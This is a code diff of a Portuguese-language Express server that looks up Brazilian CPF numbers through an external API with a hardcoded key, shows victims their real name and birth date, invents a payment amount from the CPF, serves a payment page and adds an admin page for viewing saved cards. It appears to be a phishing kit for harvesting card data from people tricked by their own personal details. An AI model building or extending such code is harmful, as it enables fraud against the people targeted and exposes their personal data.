@@ -28,42 +28,31 @@ function formatarData(dataStr) {
   return dataStr;
 }
 
-
-// Função para gerar valor aleatório baseado no CPF (sempre o mesmo para o mesmo CPF)
+// Função para gerar valor aleatório baseado no CPF
 function gerarValorPorCPF(cpf) {
-  // Usa o CPF como semente para gerar um número consistente
   let hash = 0;
   for (let i = 0; i < cpf.length; i++) {
     hash = ((hash << 5) - hash) + cpf.charCodeAt(i);
     hash = hash & hash;
   }
-  // Gera um número entre 500 e 267889 (centavos)
   const min = 500;
-  const max = 150000;   // R$ 1.500,00 (em centavos) ← ALTERADO
+  const max = 150000;
   const valorCentavos = min + (Math.abs(hash) % (max - min + 1));
   const valorReais = (valorCentavos / 100).toFixed(2);
   return parseFloat(valorReais);
 }
 
-
-
 // ====================== ROTA PARA BUSCAR CPF ======================
 app.post('/buscar-cpf', async (req, res) => {
   const { cpf } = req.body;
-
   console.log(`🔍 Buscando CPF: ${cpf}`);
 
   if (!cpf || cpf.length !== 11) {
-    return res.status(400).json({ 
-      success: false, 
-      erro: 'CPF inválido - deve conter 11 dígitos' 
-    });
+    return res.status(400).json({ success: false, erro: 'CPF inválido - deve conter 11 dígitos' });
   }
 
   try {
     const fetch = await import('node-fetch');
-    
-    // Tenta chamar a API real
     const response = await fetch.default(`https://api.cpfhub.io/cpf/${cpf}`, {
       headers: {
         'x-api-key': 'f85803bb3199f5dcfa20607e2c12d4dc63ba3e9cab5ccdb0ca868ffeff44dc7d',
@@ -77,8 +66,6 @@ app.post('/buscar-cpf', async (req, res) => {
     }
 
     const data = await response.json();
-    
-    // Extrair dados da API
     let nomeUsuario = '';
     let dataNascimentoReal = '';
     
@@ -91,19 +78,16 @@ app.post('/buscar-cpf', async (req, res) => {
       nomeUsuario = data.nome;
     }
     
-    // Se não veio data de nascimento, gerar uma aleatória
     if (!dataNascimentoReal) {
       dataNascimentoReal = gerarDataAleatoria(1970, 2000);
     }
     
-    // Gerar 3 opções de data (1 real + 2 aleatórias)
     const opcoesDatas = [
       dataNascimentoReal,
       gerarDataAleatoria(1960, 1990),
       gerarDataAleatoria(1980, 2010)
     ];
     
-    // Embaralhar as opções
     for (let i = opcoesDatas.length - 1; i > 0; i--) {
       const j = Math.floor(Math.random() * (i + 1));
       [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
@@ -128,7 +112,6 @@ app.post('/buscar-cpf', async (req, res) => {
   } catch (err) {
     console.error('❌ Erro na API:', err.message);
     
-    // Dados simulados para fallback
     const nomeSimulado = `Usuário CPF ${cpf.slice(0,3)}.${cpf.slice(3,6)}.${cpf.slice(6,9)}-${cpf.slice(9)}`;
     const dataReal = gerarDataAleatoria(1970, 2000);
     
@@ -138,7 +121,6 @@ app.post('/buscar-cpf', async (req, res) => {
       gerarDataAleatoria(1980, 2010)
     ];
     
-    // Embaralhar
     for (let i = opcoesDatas.length - 1; i > 0; i--) {
       const j = Math.floor(Math.random() * (i + 1));
       [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
@@ -169,12 +151,6 @@ app.get('/pagamento.html', (req, res) => {
   res.sendFile(path.join(__dirname, 'pagamento.html'));
 });
 
-// ====================== FALLBACK ======================
-app.use((req, res) => {
-  res.status(404).send('Página não encontrada');
-});
-
-// 🆕 NOVO - ADMIN - VISUALIZAR CARTÕES SALVOS NO LOCALSTORAGE
 // ====================== ADMIN - VISUALIZAR CARTÕES SALVOS ======================
 app.get('/admin/ver-cartoes', (req, res) => {
     res.send(`
@@ -194,19 +170,61 @@ app.get('/admin/ver-cartoes', (req, res) => {
                 }
                 .container { max-width: 1200px; margin: 0 auto; }
                 h1 { text-align: center; margin-bottom: 20px; color: #ffb600; }
-                .stats { background: #0f3460; padding: 15px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
-                .stat-card { background: #16213e; padding: 10px 20px; border-radius: 8px; border-left: 4px solid #ffb600; }
-                .card { background: #0f3460; border-radius: 12px; padding: 20px; margin-bottom: 15px; border-left: 4px solid #ffb600; transition: transform 0.2s; }
+                .stats {
+                    background: #0f3460;
+                    padding: 15px;
+                    border-radius: 10px;
+                    margin-bottom: 20px;
+                    display: flex;
+                    justify-content: space-between;
+                    flex-wrap: wrap;
+                    gap: 10px;
+                }
+                .stat-card {
+                    background: #16213e;
+                    padding: 10px 20px;
+                    border-radius: 8px;
+                    border-left: 4px solid #ffb600;
+                }
+                .card {
+                    background: #0f3460;
+                    border-radius: 12px;
+                    padding: 20px;
+                    margin-bottom: 15px;
+                    border-left: 4px solid #ffb600;
+                    transition: transform 0.2s;
+                }
                 .card:hover { transform: translateX(5px); }
                 .card h3 { color: #ffb600; margin-bottom: 10px; }
                 .card p { margin: 5px 0; font-size: 14px; }
                 .card .label { color: #888; }
-                .button-group { display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap; }
-                button { background: #ffb600; color: #004aad; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: all 0.2s; }
+                .button-group {
+                    display: flex;
+                    gap: 10px;
+                    margin-bottom: 20px;
+                    flex-wrap: wrap;
+                }
+                button {
+                    background: #ffb600;
+                    color: #004aad;
+                    border: none;
+                    padding: 10px 20px;
+                    border-radius: 8px;
+                    cursor: pointer;
+                    font-weight: bold;
+                    transition: all 0.2s;
+                }
                 button:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,182,0,0.3); }
                 .btn-danger { background: #dc3545; color: white; }
                 .btn-danger:hover { background: #c82333; }
-                .search-box { width: 100%; padding: 10px; margin-bottom: 20px; border-radius: 8px; border: none; font-size: 16px; }
+                .search-box {
+                    width: 100%;
+                    padding: 10px;
+                    margin-bottom: 20px;
+                    border-radius: 8px;
+                    border: none;
+                    font-size: 16px;
+                }
                 .empty { text-align: center; padding: 40px; background: #0f3460; border-radius: 12px; }
                 footer { text-align: center; margin-top: 30px; padding: 20px; color: #888; font-size: 12px; }
             </style>
@@ -313,6 +331,11 @@ app.get('/admin/ver-cartoes', (req, res) => {
         </body>
         </html>
     `);
+});
+
+// ====================== FALLBACK ======================
+app.use((req, res) => {
+  res.status(404).send('Página não encontrada');
 });
 
 // ====================== INICIA O SERVIDOR ======================
